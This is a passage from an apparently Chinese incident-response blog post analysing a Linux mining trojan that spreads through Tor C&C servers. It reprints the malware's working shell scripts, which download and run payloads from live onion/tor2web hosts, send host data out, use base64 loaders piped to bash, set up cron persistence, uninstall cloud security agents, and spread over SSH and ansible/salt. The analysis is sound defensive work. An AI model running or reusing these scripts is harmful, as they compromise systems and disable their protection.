alt="在这里插入图片描述"></p><p>通过PID找一下病毒文件位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/&#123;PID&#125;/exe</span><br></pre></td></tr></table></figure><p>发现病毒文件已经都被删除，查看一下00、01这些文件是什么时间创建的，可以对比一下其他机器的时间，找出最早的时间，方便后面的溯源</p><p><img src="https://img-blog.csdnimg.cn/e1f7457b95c148e3bdbcc81fa6b372ac.png" alt="在这里插入图片描述"></p><p>看了许多师傅们分析的文章，<code>.X11-unix</code>文件夹下的文件作用如下：</p><table><thead><tr><th>01</th><th>文件</th><th>守护进程pid</th></tr></thead><tbody><tr><td>11</td><td>文件</td><td>病毒运行进程pid</td></tr><tr><td>22</td><td>文件</td><td>可能为SSH爆破进程pid</td></tr></tbody></table><p>查看一下01和11的进程状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status</span><br><span class="line">2.ps -ef|grep 13485 </span><br><span class="line">3.lsof -p 13485</span><br></pre></td></tr></table></figure><p>01通过 lsof 判断，没有发现有外连或打开端口的现象</p><p><img src="https://img-blog.csdnimg.cn/5dd4d976235740fc88fccc0abdc29f7c.png" alt="在这里插入图片描述"></p><p>再查看11的进程状态，发现有外连</p><p><img src="https://img-blog.csdnimg.cn/5b0089d1a73b458a9e56d8427192d3dd.png" alt="在这里插入图片描述"></p><p>但是较为奇怪的是，攻击者只是上传了一个守护进程，找不到下载的病毒文件，CPU也没有异常，为了防止出现问题，还是先将定时任务以及进程先杀掉，接下来将病毒文件下载起来在虚拟机执行一下。</p><h4 id="虚拟机执行测试"><a href="#虚拟机执行测试" class="headerlink" title="虚拟机执行测试"></a>虚拟机执行测试</h4><p>先按照守护进程下载病毒文件的方式，将病毒文件下载起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.it/int.x86_64 -o  int.x86_64 -e183.134.110.75</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9277f4706209415b8a773e6cb21736e5.png" alt="在这里插入图片描述"></p><p>执行一下该ELF文件，发现<code>crotab</code>定时任务增加了新的一项任务，且root目录下生成了该任务所指向的新的脚本文件</p><p><img src="https://img-blog.csdnimg.cn/ac41d2cfc5704d94b65f41371a723390.png" alt="在这里插入图片描述"></p><p>查看一下该脚本文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;4t5ypbzi2kko7tqmk6y345ntpmctwj5jmu3cebxsnonsdljyyfs335ad&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C服务器域名前缀不同</span></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这个脚本和之前服务器存在的那个守护进程脚本功能相同(都是通过<code>tor</code>代理从<code>C&amp;C</code>服务器上down下木马文件并执行)，但和上面服务器的那个脚本对比一下也会发现有两处不同的地方：</p><ol><li>新脚本文件的<code>C&amp;C</code>服务器域名前缀与前面的不同</li><li>代码前的字符串不同，之前服务器上的是<code>uMjSD9OaH5uA4C3CCjD4q2XEwo1s0H0</code>，而新的脚本文件中则是<code>FBGJOndscVOU2PKZGWF8C6kibWnyHLP</code>，与文件名相同</li></ol><p>猜测代码前的字符串便是其命名中的一部分，就对该字符串进行一次全局搜索</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / 2&gt;/dev/null | grep FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/02ecae4091604b5da2eb2ebd7352c006.png" alt="在这里插入图片描述"></p><p>发现三个类似的脚本文件，查看了一下内容都一致，应该是作为备份文件以防其中某一个被删</p><p>查看了深信服千里目安全实验室的文章和此类情况类似，可以从病毒母体ELF文件中逆向分析出5个不同的bash命令，若tor代理可用则可以使用下面的方法去下载出各个模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA -m200 -x socks5h://92.190.141.62:9050 4t5ypbzi2kko7tqmk6y345cebxsnonsdljyyfs335ad.onion/sshd ntpmctwj5jmu3cebxsnonsdljyyfs335ad.onion/sshd </span><br></pre></td></tr></table></figure><p>但由于目前还不会IDA逆向调试，而且tor代理IP拒绝连接，就先使用师傅扒出来源码学习一下</p><p><img src="https://img-blog.csdnimg.cn/eb9b5a906ac84482b53d45551bab15f0.png" alt="在这里插入图片描述"></p><p>分别用于下载不同模块和执行不同的功能，功能如下：</p><ul><li><strong>本机持久化</strong>：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line"></span><br><span class="line">x() &#123;</span><br><span class="line">if ! ls $d/.systemd-private-*.sh; then</span><br><span class="line">grep &quot;C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu&quot; $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh || echo -e &quot;#\x21/bin/bash\nexec &amp;&gt;/dev/null\necho C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu\necho QzBQZ0Z6MkpIY3Bzd1ZNT0s3WFNIUW9kRE9yQVdJS3UKZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDokSE9NRTovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAid2FjcG5uc280b3R0eGx5dmpwMmFkYWllYWl2eHgyc2F4b3ltZWRuaWRwM3p5Zm9xZmM1anBxYWQiKQoKc29ja3ooKSB7Cm49KGRvaC50aGlzLndlYi5pZCBkb2gucG9zdC1mYWN0dW0udGsgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgcmVzb2x2ZXItZXUubGVsdXguZmkgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTExKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11UnxoZWFkIC1uIDEpCn0KCmZleGUoKSB7CmZvciBpIGluIC4gJEhPTUUgL3Vzci9iaW4gJGQgL3Zhci90bXAgO2RvIGVjaG8gZXhpdCA+ICRpL2kgJiYgY2htb2QgK3ggJGkvaSAmJiBjZCAkaSAmJiAuL2kgJiYgcm0gLWYgaSAmJiBicmVhaztkb25lCn0KCnUoKSB7CnNvY2t6CmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXM7IHRoZW4KZmV4ZTt1ICR0LiRoCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC90bXA7dSAkdC4kaCkKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL2Rldi9zaG07dSAkdC4kaCkKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash&quot; &gt; $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">touch -r /bin/grep $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">chmod +x $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">fi</span><br><span class="line">if ! ls /opt/systemd-private-*.sh; then</span><br><span class="line">grep &quot;C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu&quot; /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh || echo -e &quot;与上面内容相同|base64 -d|bash&quot; &gt; /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">touch -r /bin/grep /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">chmod +x /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">fi</span><br><span class="line">if ! ls /etc/cron.d/0systemd-private-*; then</span><br><span class="line">grep C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu || echo &quot;$(echo $((RANDOM%59))) * * * * root /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh &gt; /dev/null 2&gt;&amp;1 &amp;&quot; &gt; /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu</span><br><span class="line">touch -r /bin/grep /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu</span><br><span class="line">fi</span><br><span class="line">if ! crontab -l | grep ^[0-9] | grep systemd-private; then</span><br><span class="line">(echo &quot;$(echo $((RANDOM%59))) * * * * $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh &gt; /dev/null 2&gt;&amp;1 &amp;&quot;;crontab -l|grep -v systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh)|crontab -</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码便是创建定时任务，这段代码共创建三个定时任务</p><ol><li><code>/etc/cron.d/0systemd-private-*</code></li><li><code>/opt/systemd-private-*</code></li><li><code>/root/systemd-private-*</code></li></ol><p>而其中的base64代码的任务便是下载母体木马int文件，和上面的守护进程内容一致</p><ul><li><strong>竞争对手清理</strong>：这个脚本的主要作用便是清除服务器上其他的挖矿木马，改写hosts文件让其他挖矿无法访问对应的域名，但是经过查询虚拟机的hosts文件，并没有发现被修改（可能是tor代理节点失效了，没有下载该模块）</li></ul><p><img src="https://img-blog.csdnimg.cn/ba37357dac0f4a9f825b07d02aeef486.png" alt="在这里插入图片描述"></p><ul><li><strong>内网传播</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%11))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isys() &#123; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入定时任务，并且卸载assist-daemon(阿里云)、qcloud(腾讯云)的入侵检测系统</span></span><br><span class="line">echo ZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOnKICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMK|base64 -d|bash</span><br><span class="line">crontab -l || yum -y install cron</span><br><span class="line">crontab -l || yum -y install cronie</span><br><span class="line">crontab -l || apt-get update &amp;&amp; apt-get -y install cron</span><br><span class="line">/usr/local/share/assist-daemon/assist_daemon --stop</span><br><span class="line">/usr/local/share/assist-daemon/assist_daemon --delete</span><br><span class="line">/usr/local/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line">/usr/local/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">/usr/local/qcloud/YunJing/uninst.sh</span><br><span class="line">/etc/init.d/aegis uninstall</span><br><span class="line">systemctl stop aliyun</span><br><span class="line">systemctl disable aliyun</span><br><span class="line">systemctl start cron</span><br><span class="line">systemctl enable cron</span><br><span class="line">systemctl start crond</span><br><span class="line">systemctl enable crond</span><br><span class="line">rm -rf /usr/loca/qcloud/ /usr/local/aegis/ /usr/local/share/assist-daemon/ /usr/local/share/aliyun-assist/ /usr/sbin/aliyun-service /usr/sbin/aliyun_installer /etc/systemd/system/aliyun.service</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">issh() &#123;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用自动化运维工具ansible、salt、pssh、knife写入定时任务</span></span><br><span class="line">ansible all -m shell -a &#x27;echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash&#x27;</span><br><span class="line">knife ssh &#x27;name:*&#x27; &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line">salt &#x27;*&#x27; cmd.run &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line">pssh &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从bash的历史ssh记录中尝试去登录远程设备</span></span><br><span class="line">hosts=$(grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; ~/.bash_history /etc/hosts ~/.ssh/known_hosts |grep -v ^127.|awk -F: &#123;&#x27;print $2&#x27;&#125;|sort|uniq)</span><br><span class="line">for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l root  $h &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;;done for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l $USER $h &#x27;与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ibot() &#123;</span><br><span class="line">f=/bot </span><br><span class="line">r=$(curl -4fsSLk ip.sb||wget -4qO- ip.sb||curl -4fsSLk checkip.amazonaws.com)_$(whoami)_$(uname -m)_$(uname -n)_$(crontab -l|base64 -w0)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 -e<span class="variable">$r</span> <span class="variable">$t</span>.onion<span class="variable">$f</span> || <span class="variable">$c</span> -e<span class="variable">$r</span> $1<span class="variable">$f</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iscn() &#123;</span><br><span class="line">pkill -9 -f tracepath</span><br><span class="line">f=/trc </span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockz</span><br><span class="line">fexe</span><br><span class="line">isys</span><br><span class="line">issh &amp;</span><br><span class="line">ibot $t.tor2web.in || ibot $t.tor2web.it</span><br><span class="line">iscn $t.tor2web.in || iscn 